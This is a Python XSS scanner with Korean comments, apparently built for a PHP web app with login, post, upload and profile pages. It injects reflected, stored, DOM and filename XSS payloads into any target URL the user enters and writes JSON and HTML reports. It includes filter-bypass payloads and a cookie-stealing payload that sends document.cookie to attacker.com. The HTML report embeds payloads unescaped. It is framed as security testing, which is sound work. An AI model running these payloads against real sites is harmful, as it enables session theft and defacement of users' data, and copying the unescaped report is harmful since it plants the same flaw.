import requests
import json
from datetime import datetime
from urllib.parse import urljoin, quote
import re
from bs4 import BeautifulSoup
import time

class XSSScanner:
    def __init__(self, target_url, session_cookie=None):
        self.target_url = target_url
        self.session = requests.Session()
        
        # 타임아웃 설정 추가
        self.session.timeout = 30
        
        # 헤더 설정 추가
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        if session_cookie:
            self.session.cookies.set('PHPSESSID', session_cookie)

        # XSS 페이로드 리스트
        self.payloads = {
            'basic': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '"><script>alert(1)</script>',
                "';alert(1);//",
                '"><img src=x onerror=alert(1)>',
                '\'><script>alert(1)</script>',
            ],
            'advanced': [
                '<img src=x onerror="javascript:alert(1)">',
                '<body onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>',
                '<keygen onfocus=alert(1) autofocus>',
                '<video><source onerror="alert(1)">',
                '<audio src=x onerror=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
            ],
            'encoding_bypass': [
                '&#60;script&#62;alert(1)&#60;/script&#62;',
                '\u003cscript\u003ealert(1)\u003c/script\u003e',
                '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
                '&lt;script&gt;alert(1)&lt;/script&gt;',
            ],
            'filter_bypass': [
                '<ScRiPt>alert(1)</ScRiPt>',
                '<script>alert`1`</script>',
                '<script>alert(/XSS/)</script>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<<script>alert(1);//<</script>',
                '<scr<script>ipt>alert(1)</scr</script>ipt>',
            ]
        }

        self.vulnerable_inputs = []
        self.test_results = []

    def test_connection(self):
        """서버 연결 테스트"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            print(f"[+] Connection successful: {self.target_url} (Status: {response.status_code})")
            return True
        except requests.exceptions.ConnectTimeout:
            print(f"[-] Connection timeout: {self.target_url}")
            return False
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error: {self.target_url}")
            return False
        except Exception as e:
            print(f"[-] Error: {str(e)}")
            return False

    def scan_page(self, page_url):
        """특정 페이지의 입력 필드를 찾아 XSS 테스트"""
        try:
            response = self.session.get(page_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')

            # 디버그 정보 출력
            print(f"  - Page title: {soup.title.string if soup.title else 'No title'}")
            
            # 폼 찾기
            forms = soup.find_all('form')
            print(f"  - Found {len(forms)} forms")
            
            for i, form in enumerate(forms):
                print(f"  - Testing form {i+1}...")
                self.test_form(page_url, form)

            # URL 파라미터 테스트
            self.test_url_params(page_url)

            # 추가: 모든 입력 필드 직접 찾기
            all_inputs = soup.find_all(['input', 'textarea'])
            print(f"  - Found {len(all_inputs)} input fields total")

        except Exception as e:
            print(f"Error scanning {page_url}: {str(e)}")

    def test_form(self, page_url, form):
        """폼의 각 입력 필드에 XSS 페이로드 테스트"""
        action = form.get('action', '')
        method = form.get('method', 'get').lower()
        form_url = urljoin(page_url, action) if action else page_url

        # 입력 필드 찾기
        inputs = form.find_all(['input', 'textarea', 'select'])
        
        # 디버그 정보
        print(f"    - Form action: {action}, method: {method}")
        print(f"    - Input fields: {[inp.get('name') for inp in inputs if inp.get('name')]}")

        for input_field in inputs:
            input_name = input_field.get('name')
            input_type = input_field.get('type', 'text')

            if not input_name or input_type in ['submit', 'button', 'reset']:
                continue

            # 각 페이로드로 테스트
            for category, payloads in self.payloads.items():
                for payload in payloads[:2]:  # 처음 몇 개만 테스트
                    self.test_input(form_url, method, input_name, payload, category)
                    time.sleep(0.5)  # Rate limiting

    def test_input(self, url, method, param_name, payload, category):
        """특정 입력 필드에 페이로드 주입 테스트"""
        test_data = {param_name: payload}

        try:
            if method == 'post':
                response = self.session.post(url, data=test_data, timeout=10)
            else:
                response = self.session.get(url, params=test_data, timeout=10)

            # XSS 취약점 확인
            vulnerable = self.check_vulnerability(response.text, payload)
            
            if vulnerable:
                vulnerability = {
                    'url': url,
                    'method': method,
                    'parameter': param_name,
                    'payload': payload,
                    'category': category,
                    'timestamp': datetime.now().isoformat()
                }
                self.vulnerable_inputs.append(vulnerability)
                print(f"[VULNERABLE] {url} - {param_name} - {category}")
                print(f"  Payload: {payload}")

            # 결과 저장
            self.test_results.append({
                'url': url,
                'method': method,
                'parameter': param_name,
                'payload': payload,
                'category': category,
                'vulnerable': vulnerable,
                'response_code': response.status_code,
                'timestamp': datetime.now().isoformat()
            })

        except Exception as e:
            print(f"Error testing {url} with {payload}: {str(e)}")

    def test_url_params(self, url):
        """URL 파라미터를 통한 Reflected XSS 테스트"""
        # 일반적인 파라미터 이름들
        test_params = ['q', 'search', 'query', 'keyword', 'name', 'email', 'message', 
                      'comment', 'text', 'input', 'data', 'value', 'content', 'id',
                      'user', 'username', 'title', 'description', 'full_name']

        print(f"  - Testing URL parameters...")
        
        for param in test_params:
            # 간단한 페이로드로 먼저 테스트
            simple_payload = '<script>alert(1)</script>'
            test_url = f"{url}?{param}={quote(simple_payload)}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                if self.check_vulnerability(response.text, simple_payload):
                    vulnerability = {
                        'url': url,
                        'method': 'GET',
                        'parameter': param,
                        'payload': simple_payload,
                        'category': 'reflected',
                        'type': 'reflected',
                        'timestamp': datetime.now().isoformat()
                    }
                    self.vulnerable_inputs.append(vulnerability)
                    print(f"[VULNERABLE - Reflected] {url} - {param}")
                    
                    # 취약한 파라미터에 대해 더 많은 페이로드 테스트
                    for category, payloads in self.payloads.items():
                        for payload in payloads[:2]:
                            self.test_input(url, 'GET', param, payload, category)
                            
            except Exception as e:
                pass

    def check_vulnerability(self, response_text, payload):
        """응답에서 페이로드가 그대로 반영되었는지 확인"""
        # 기본 체크: 페이로드가 그대로 포함되어 있는지
        if payload in response_text:
            return True
        
        # 부분적으로 포함되어 있는지 체크
        # <script>alert(1)</script> -> alert(1)가 포함되어 있는지
        script_content = re.search(r'<script[^>]*>(.*?)</script>', payload, re.IGNORECASE)
        if script_content and script_content.group(1) in response_text:
            return True
        
        # 이벤트 핸들러 체크
        event_match = re.search(r'on\w+\s*=\s*["\']?(.*?)["\']?[\s>]', payload, re.IGNORECASE)
        if event_match and event_match.group(1) in response_text:
            return True
            
        return False
    
    def deep_check(self, response_text, payload):
        """더 정밀한 취약점 체크"""
        # HTML 파싱을 통해 스크립트가 실행 가능한 컨텍스트인지 확인
        soup = BeautifulSoup(response_text, 'html.parser')

        # 스크립트 태그 확인
        scripts = soup.find_all('script')
        for script in scripts:
            if payload in str(script):
                return True
            
        # 이벤트 핸들러 확인
        event_pattern = r'on\w+\s*=\s*["\'].*' + re.escape(payload) + r'.*["\']'
        if re.search(event_pattern, response_text, re.IGNORECASE):
            return True
        
        return False
    
    def scan_all_pages(self):
        """모든 페이지 스캔"""
        pages = [
            'login.php',
            'index.php',
            'upload.php',
            'profile.php',
            'new_post.php',
            'file.php',
            'register.php',
            'search.php',
            'comment.php'
        ]

        for page in pages:
            page_url = urljoin(self.target_url, page)
            print(f"\n[*] Scanning {page_url}...")
            self.scan_page(page_url)
            time.sleep(1) # Rate limiting

    def generate_report(self, output_file='xss_report.json'):
        """테스트 결과 리포트 생성"""
        report = {
            'scan_info': {
                'target_url': self.target_url,
                'scan_date': datetime.now().isoformat(),
                'total_tests': len(self.test_results),
                'vulnerabilities_found': len(self.vulnerable_inputs)
            },
            'vulnerabilities': self.vulnerable_inputs,
            'all_test_results': self.test_results
        }

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        # HTML 리포트 생성
        self.generate_html_report(report)

        print(f"\n[+] Report saved to {output_file}")
        return report
    
    def generate_html_report(self, report_data):
        """HTML 형식의 리포트 생성"""
        html_template = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>XSS Vulnerability Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background-color: #f0f0f0; padding: 20px; border-radius: 5px; }}
                .vulnerability {{ background-color: #ffe6e6; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 5px solid #ff0000; }}
                .info {{ background-color: #e6f3ff; padding: 10px; margin: 10px 0; border-radius: 5px; }}
                table {{ border-collapse: collapse; width: 100%; margin-top: 20px; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #4CAF50; color: white; }}
                .payload {{ font-family: monospace; background-color: #f5f5f5; padding: 2px 4px; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>XSS Vulnerability Scan Report</h1>
                <p><strong>Target:</strong> {target_url}</p>
                <p><strong>Scan Date:</strong> {scan_date}</p>
                <p><strong>Total Tests:</strong> {total_tests}</p>
                <p><strong>Vulnerabilities Found:</strong> {vulnerabilities_found}</p>
            </div>
            
            <h2>Vulnerabilities Found</h2>
            {vulnerabilities_section}
            
            <h2>Detailed Test Results</h2>
            <table>
                <tr>
                    <th>URL</th>
                    <th>Method</th>
                    <th>Parameter</th>
                    <th>Payload</th>
                    <th>Category</th>
                    <th>Vulnerable</th>
                </tr>
                {test_results_rows}
            </table>
        </body>
        </html>
        """

        # 취약점 섹션 생성
        vulnerabilities_html = ""
        for vuln in report_data['vulnerabilities']:
            vulnerabilities_html += f"""
            <div class="vulnerability">
                <h3>{vuln['url']} - {vuln['parameter']}</h3>
                <p><strong>Method:</strong> {vuln['method']}</p>
                <p><strong>Payload:</strong> <span class="payload">{vuln['payload']}</span></p>
                <p><strong>Category:</strong> {vuln['category']}</p>
                <p><strong>Timestamp:</strong> {vuln['timestamp']}</p>
            </div>
            """

        # 테스트 결과 행 생성
        test_rows = ""
        for result in report_data['all_test_results']:
            vulnerable_class = 'style="background-color: #ffe6e6;"' if result['vulnerable'] else ''
            test_rows += f"""
            <tr {vulnerable_class}>
                <td>{result['url']}</td>
                <td>{result['method']}</td>
                <td>{result['parameter']}</td>
                <td class="payload">{result['payload']}</td>
                <td>{result['category']}</td>
                <td>{'Yes' if result['vulnerable'] else 'No'}</td>
            </tr>
            """

        # HTML 완성
        html_content = html_template.format(
            target_url=report_data['scan_info']['target_url'],
            scan_date=report_data['scan_info']['scan_date'],
            total_tests=report_data['scan_info']['total_tests'],
            vulnerabilities_found=report_data['scan_info']['vulnerabilities_found'],
            vulnerabilities_section=vulnerabilities_html if vulnerabilities_html else '<p class="info">No vulnerabilities found.</p>',
            test_results_rows=test_rows
        )

        with open('xss_report.html', 'w', encoding='utf-8') as f:
            f.write(html_content)


# 페이지별 특화 테스트 클래스
class AdvancedXSSScanner(XSSScanner):
    def __init__(self, target_url, session_cookie=None):
        super().__init__(target_url, session_cookie)

        # 페이지별 특화 페이로드
        self.page_specific_payloads = {
            'new_post.php': [
                # 게시글 작성 페이지 - Stored XSS
                '<script>document.cookie</script>',
                '<img src=x onerror="fetch(\'http://attacker.com/steal?c=\'+document.cookie)">',
                '<svg/onload="location.href=\'http://attacker.com\'">',
            ],
            'profile.php': [
                # 프로필 페이지 - 이메일/이름 필드
                '?email=test@test.com<script>alert(1)</script>&full_name=test',
                '?email=test@test.com&full_name=John<img src=x onerror=alert(1)>Doe',
                '?email="><script>alert(document.domain)</script>&full_name=test',
            ],
            'upload.php': [
                # 파일 업로드 - 파일명 XSS
                'test<script>alert(1)</script>.txt',
                'image"><img src=x onerror=alert(1)>.jpg',
            ],
            'file.php': [
                # 파일 목록 - 파일명 표시 XSS
                '?name=<script>alert(1)</script>',
                '?name=<img src=x onerror=alert(1)>',
            ]
        }

    def test_stored_xss(self, post_url):
        """Stored XSS 테스트 (게시글, 댓글 등)"""
        print(f"\n[*] Testing Stored XSS on {post_url}")

        stored_payloads = [
            {
                'title': 'Test Post <script>alert(1)</script>',
                'content': 'Normal content'
            },
            {
                'title': 'Normal Title',
                'content': '<img src=x onerror="alert(\'Stored XSS\')">'
            },
            {
                'title': 'Test"><script>alert(document.cookie)</script>',
                'content': '<svg onload="alert(1)">'
            }
        ]

        for payload_data in stored_payloads:
            try:
                # 게시글 작성
                response = self.session.post(post_url, data=payload_data)

                # 메인 페이지에서 확인 (게시글이 표시되는 곳)
                time.sleep(1)
                index_response = self.session.get(urljoin(self.target_url, 'index.php'))

                # Stored XSS 확인
                for field, value in payload_data.items():
                    if self.check_vulnerability(index_response.text, value):
                        vulnerability = {
                            'url': post_url,
                            'type': 'Stored XSS',
                            'field': field,
                            'payload': value,
                            'category': 'stored',
                            'severity': 'HIGH',
                            'timestamp': datetime.now().isoformat()
                        }
                        self.vulnerable_inputs.append(vulnerability)
                        print(f"[HIGH RISK - Stored XSS] {field}: {value[:50]}...")

            except Exception as e:
                print(f"Error testing stored XSS: {str(e)}")

    def test_file_upload_xss(self, upload_url):
        """파일 업로드 관련 XSS 테스트"""
        print(f"\n[*] Testing File Upload XSS on {upload_url}")

        # 악성 파일명 테스트
        malicious_filenames = [
            'test<script>alert(1)</script>.txt',
            'image"><img src=x onerror=alert(1)>.jpg',
            'file\';alert(1);//.pdf',
            'document<svg onload=alert(1)>.doc'
        ]

        for filename in malicious_filenames:
            # 더미 파일 생성
            files = {'file': (filename, 'test content', 'text/plain')}

            try:
                response = self.session.post(upload_url, files=files)

                # 파일 목록 페이지 확인
                file_list_response = self.session.get(urljoin(self.target_url, 'file.php'))

                if self.check_vulnerability(file_list_response.text, filename):
                    vulnerability = {
                        'url': upload_url,
                        'type': 'File Upload XSS',
                        'payload': filename,
                        'category': 'file_upload',
                        'severity': 'MEDIUM',
                        'timestamp': datetime.now().isoformat()
                    }
                    self.vulnerable_inputs.append(vulnerability)
                    print(f"[VULNERABLE - File Upload] {filename}")

            except Exception as e:
                print(f"Error testing file upload: {str(e)}")

    def test_dom_xss(self, page_url):
        """DOM-based XSS 테스트"""
        print(f"\n[*] Testing DOM-based XSS on {page_url}")

        dom_payloads = [
            '#<img src=x onerror=alert(1)>',
            '#"><script>alert(1)</script>',
            'javascript:alert(1)',
            '#\'-alert(1)-\'',
            '#onclick=alert(1)//'
        ]

        for payload in dom_payloads:
            test_url = page_url + payload
            try:
                response = self.session.get(test_url)

                # JavaScript 코드에서 취약점 패턴 찾기
                js_patterns = [
                    r'location\.hash',
                    r'document\.write\(',
                    r'innerHTML\s*=',
                    r'eval\(',
                    r'setTimeout\(',
                    r'setInterval\('
                ]

                for pattern in js_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        # DOM 조작 코드가 있고 입력값이 반영되는지 확인
                        if payload in response.text or quote(payload) in response.text:
                            vulnerability = {
                                'url': test_url,
                                'type': 'DOM-based XSS',
                                'payload': payload,
                                'pattern': pattern,
                                'category': 'dom_based',
                                'severity': 'MEDIUM',
                                'timestamp': datetime.now().isoformat()
                            }
                            self.vulnerable_inputs.append(vulnerability)
                            print(f"[POTENTIAL DOM XSS] {page_url} - Pattern: {pattern}")
                            break

            except Exception as e:
                print(f"Error testing DOM XSS: {str(e)}")

    def enhanced_scan(self):
        """향상된 스캔 - 페이지별 특화 테스트 포함"""
        # 기본 스캔
        self.scan_all_pages()

        # Stored XSS 테스트
        self.test_stored_xss(urljoin(self.target_url, 'new_post.php'))

        # 파일 업로드 XSS 테스트
        self.test_file_upload_xss(urljoin(self.target_url, 'upload.php'))

        # DOM-based XSS 테스트
        for page in ['index.php', 'profile.php', 'file.php']:
            self.test_dom_xss(urljoin(self.target_url, page))


# 자동 로그인 및 세션 관리
class XSSAutomation:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()

    def auto_login(self, username, password):
        """자동 로그인"""
        login_url = urljoin(self.target_url, 'login.php')
        login_data = {
            'username': username,
            'password': password
        }

        try:
            response = self.session.post(login_url, data=login_data, timeout=10)
            if 'index.php' in response.text or 'logout' in response.text:
                print("[+] Login successful")
                return self.session.cookies.get('PHPSESSID')
            else:
                print("[-] Login failed")
                return None
        except Exception as e:
            print(f"[-] Login error: {str(e)}")
            return None
        
    def run_full_scan(self, username, password):
        """전체 자동화 스캔 실행"""
        # 1. 로그인
        session_cookie = self.auto_login(username, password)
        if not session_cookie:
            print("[-] Cannot proceed without login")
            return
        
        # 2. 스캐너 초기화
        scanner = AdvancedXSSScanner(self.target_url, session_cookie)

        # 3. 향상된 스캔 실행
        print("\n[*] Starting comprehensive XSS scan...")
        scanner.enhanced_scan()

        # 4. 리포트 생성
        report = scanner.generate_report('xss_vulnerability_report.json')

        # 5. 취약점 요약
        self.print_summary(scanner.vulnerable_inputs)

        return report
    
    def print_summary(self, vulnerabilities):
        """취약점 요약 출력"""
        print("\n" + "="*60)
        print("XSS VULNERABILITY SUMMARY")
        print("="*60)

        if not vulnerabilities:
            print("No vulnerabilities found!")
            return
        
        # 심각도별 분류
        by_severity = {'HIGH': [], 'MEDIUM': [], 'LOW': []}
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'MEDIUM')
            by_severity[severity].append(vuln)

        for severity in ['HIGH', 'MEDIUM', 'LOW']:
            if by_severity[severity]:
                print(f"\n{severity} Risk Vulnerabilities ({len(by_severity[severity])}):")
                for vuln in by_severity[severity]:
                    print(f"  - {vuln['url']} ({vuln.get('type', 'XSS')})")
                    print(f"    Parameter: {vuln.get('parameter', vuln.get('field', 'N/A'))}")
                    print(f"    Payload: {vuln['payload'][:50]}...")


# 실행 예시
if __name__ == "__main__":
    # 첫 번째 대화형 모드
    target_url = input("Target URL을 입력하세요: ").strip()
    
    # URL 정규화
    if not target_url.startswith('http'):
        target_url = 'http://' + target_url
    if not target_url.endswith('/'):
        target_url += '/'
    
    # 세션 쿠키 입력 (선택사항)
    session_cookie = input("Session cookie (PHPSESSID) [Enter to skip]: ").strip()
    
    # 스캐너 초기화
    scanner = XSSScanner(target_url, session_cookie if session_cookie else None)
    
    # 연결 테스트
    print(f"\n[*] Testing connection to {target_url}...")
    if not scanner.test_connection():
        print("[-] Failed to connect to target. Please check:")
        print("  1. The URL is correct")
        print("  2. The server is running")
        print("  3. Your network connection")
        print("  4. Any firewall/security settings")
        
        # 다른 포트 시도
        alternative_ports = ['8080', '8000', '3000']
        for port in alternative_ports:
            alt_url = target_url.replace(':80/', f':{port}/')
            print(f"\n[*] Trying alternative port: {alt_url}")
            scanner.target_url = alt_url
            if scanner.test_connection():
                target_url = alt_url
                break
        else:
            exit(1)
    
    # 스캔 모드 선택
    print("\n[*] Select scan mode:")
    print("1. Basic scan (faster)")
    print("2. Comprehensive scan with login (recommended)")
    print("3. Custom pages scan")
    
    mode = input("\nEnter your choice (1-3): ").strip()
    
    if mode == '1':
        # 기본 스캔
        print("\n[*] Starting basic XSS vulnerability scan...")
        scanner.scan_all_pages()
        
    elif mode == '2':
        # 로그인 정보 입력
        print("\n[*] Enter login credentials:")
        username = input("Username: ").strip()
        password = input("Password: ").strip()
        
        # 자동화 스캔
        automation = XSSAutomation(target_url)
        report = automation.run_full_scan(username, password)
        
        if report:
            print("\n[+] Scan completed successfully!")
        else:
            print("\n[-] Scan failed. Falling back to basic scan...")
            scanner.scan_all_pages()
            
    elif mode == '3':
        # 커스텀 페이지 스캔
        print("\n[*] Enter pages to scan (separated by comma):")
        print("Example: index.php,login.php,profile.php")
        pages_input = input("Pages: ").strip()
        pages = [p.strip() for p in pages_input.split(',')]
        
        for page in pages:
            page_url = urljoin(target_url, page)
            print(f"\n[*] Scanning {page_url}...")
            scanner.scan_page(page_url)
            time.sleep(1)
    
    else:
        print("[-] Invalid choice. Running basic scan...")
        scanner.scan_all_pages()
    
    # 리포트 생성
    print("\n[*] Generating report...")
    report = scanner.generate_report()
    
    # 결과 출력
    print("\n" + "="*50)
    print("SCAN SUMMARY")
    print("="*50)
    print(f"Target: {target_url}")
    print(f"Total tests performed: {len(scanner.test_results)}")
    print(f"Vulnerabilities found: {len(scanner.vulnerable_inputs)}")
    
    if scanner.vulnerable_inputs:
        print("\n[!] VULNERABILITIES FOUND:")
        print("-" * 50)
        
        # 타입별로 그룹화
        vuln_by_type = {}
        for vuln in scanner.vulnerable_inputs:
            vuln_type = vuln.get('type', vuln.get('category', 'Unknown'))
            if vuln_type not in vuln_by_type:
                vuln_by_type[vuln_type] = []
            vuln_by_type[vuln_type].append(vuln)
        
        for vuln_type, vulns in vuln_by_type.items():
            print(f"\n{vuln_type} ({len(vulns)} found):")
            for vuln in vulns:
                print(f"  - URL: {vuln['url']}")
                print(f"    Parameter: {vuln.get('parameter', vuln.get('field', 'N/A'))}")
                print(f"    Payload: {vuln['payload'][:50]}...")
                print(f"    Method: {vuln.get('method', 'N/A')}")
    else:
        print("\n[+] No vulnerabilities found.")
        print("This could mean:")
        print("  1. The application is secure")
        print("  2. XSS protections are in place")
        print("  3. Need to test with authentication")
        print("  4. Need more specific payloads")
    
    print(f"\n[+] Full report saved to:")
    print(f"  - JSON: xss_report.json")
    print(f"  - HTML: xss_report.html")
    
    # 추가 권장사항
    print("\n[*] Recommendations:")
    if len(scanner.vulnerable_inputs) > 0:
        print("  1. Fix all identified vulnerabilities")
        print("  2. Implement input validation and output encoding")
        print("  3. Use Content Security Policy (CSP)")
        print("  4. Regular security testing")
    else:
        print("  1. Test with authenticated session")
        print("  2. Try manual testing for complex scenarios")
        print("  3. Check for DOM-based XSS manually")
        print("  4. Test file upload functionality")
    
    # 수동 테스트 안내
    print("\n[*] For manual testing, try these payloads:")
    print('  - <script>alert(document.cookie)</script>')
    print('  - <img src=x onerror="alert(1)">')
    print('  - javascript:alert(1)')
    print('  - <svg/onload=alert(1)>')
    
    print("\n[*] Scan completed!")